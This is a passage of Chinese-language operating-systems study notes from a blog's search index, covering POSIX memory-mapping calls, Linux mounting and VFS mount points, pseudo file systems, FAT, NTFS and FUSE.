<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">;--- POSIX 文件内存映射接口 ---;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 提供映射的目标虚拟地址, 长度, 属性, 标志位, 文件描述符, 起始位置在文件中的偏移量 */</span></span><br><span class="line"><span class="type">void</span> *<span class="title function_">mmap</span><span class="params">(<span class="type">void</span> *addr, <span class="type">size_t</span> len, <span class="type">int</span> prot, <span class="type">int</span> flags, <span class="type">int</span> fildes, <span class="type">off_t</span> off)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* msync是请求VFS对指定内存映射区域进行同步写回操作 */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">msync</span><span class="params">(<span class="type">void</span> *addr, <span class="type">size_t</span> len, <span class="type">int</span> flags)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 当所有操作完成之后, APP可以调用munmap, 移除指定的虚拟内存地址区域上的内存映射 */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">munmap</span><span class="params">(<span class="type">void</span> *addr, <span class="type">size_t</span> len)</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>挂载</strong><code>mounting</code>是指由操作系统使一个<strong>存储设备</strong>（诸如硬盘、CD-ROM或共享资源）上的<strong>电脑档案</strong>和<strong>目录</strong>可供用户通过计算机的文件系统访问的一个过程。一般来说，当计算机关机时，每个已<strong>挂载</strong>存储都将经历一次卸载，以确保所有排队的数据被写入，并保证介质上文件系统结构的完整性。</p>
<ul>
<li><strong>linux</strong>操作系统将所有的设备都看作文件，它将整个计算机的资源都整合成一个大的文件目录。我们要访问存储设备中的文件，必须将文件所在的分区挂载到一个已存在的目录上，然后通过访问这个目录来访问存储设备。挂载就是把设备放在一个目录下，让系统知道怎么管理这个设备里的文件，了解这个存储设备的可读写特性之类的过程。</li>
<li>我们不是有<code>/dev/sdb1</code>吗，直接对它操作不就行了？这不是它的目录吗？</li>
<li>这不是它的目录。虽然&#x2F;dev是个目录，但&#x2F;dev&#x2F;sdb1不是目录。可以发现ls&#x2F;dev&#x2F;sdb1无法执行。&#x2F;dev&#x2F;sdb1，是一个类似指针的东西，指向这个分区的原始数据块。mount前，系统并不知道这个数据块哪部分数据代表文件，如何对它们操作。</li>
<li>这时提问者使用了 <code>mount /dev/sdb1 ~/Share/</code> ，把新硬盘的区sdb1挂载到工作目录的<code>~/Share/</code>文件夹下，之后访问这个<code>~/Share/</code>文件夹就相当于访问这个硬盘2的sdb1分区了。对&#x2F;Share&#x2F;的任何操作，都相当于对sdb1里文件的操作。<strong>这也就是挂载的作用：使用户可以访问这个分区（磁盘）。</strong></li>
</ul>
</li>
<li><p>每个文件系统都有一个根目录，但应用程序所使用的路径通常只有一个根目录。</p>
</li>
<li><p>Linux 的<code>VFS</code>维护一个统一的<code>VFS</code>文件系统树，OS启动时会有一个根文件系统，如<code>FS0</code></p>
<ul>
<li>在根文件系统的基础上，其他文件系统可以被自由地挂载到VFS的任何一个目录之上，这些<strong>作为挂载目标的目录，便称为挂载点</strong></li>
<li>Linux通过三种结构体<code>vfsmount (挂载文件系统信息)</code>、<code>mountpoint (挂载点信息)</code>、<code>mount (挂载文件系统结构体, 且包含了前两种)</code>，其<code>VFS</code>可以灵活地挂载多种文件系统，让各种不同的文件系统可以在相同的操作系统下工作。</li>
</ul>
</li>
<li><p>伪文件系统<code>pseudo file system</code>：Linux实现的一些不用于<strong>保存文件数据</strong>的文件系统</p>
<ul>
<li>作用之一：允许用户<code>user</code>态应用程序通过<strong>读取文件</strong>的方式对读取内核提供的信息，并通过<strong>写入文件</strong>的方式对操作系统<strong>内核</strong>进行配置和调整</li>
</ul>
</li>
<li><p>FAT文件系统</p>
<ul>
<li>FAT<code>File Allocation Table</code>：文件分配表</li>
<li>簇<code>cluster</code>（对应于之前所说的<strong>块</strong><code>block</code>）：逻辑存储单元，每个簇对应于物理存储上的一个或多个存储扇区<code>sector</code></li>
<li>簇号：每个簇对应的地址</li>
<li><code>FAT</code>是一个由簇号组成的数组，且FAT中记录的簇号，为逻辑上的下一个簇的簇号（类比单链表）</li>
</ul>
</li>
<li><p>NTFS<code>New Technology File System</code></p>
<ul>
<li>主文件表<code>MFT (Master File Table)</code></li>
<li>稀疏文件<code>sparse file</code>：存在大片连续为0（所有比特位均为0）的数据的文件</li>
</ul>
</li>
<li><p><code>FUSE</code>与用户态文件系统</p>
<ul>
<li><code>FUSE</code>模块：为了能让其他应用程序使用用户态文件系统提供的服务，<strong>宏内核</strong>中需要加入支持相应功能的模块，比较流行和常用的是<code>FUSE</code>模块和框架<ul>
<li>存在问题：性能较差</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>system</category>
      </categories>
      <tags>
        <tag>operating system</tag>
        <tag>system</tag>
      </tags>
  </entry>
</search>
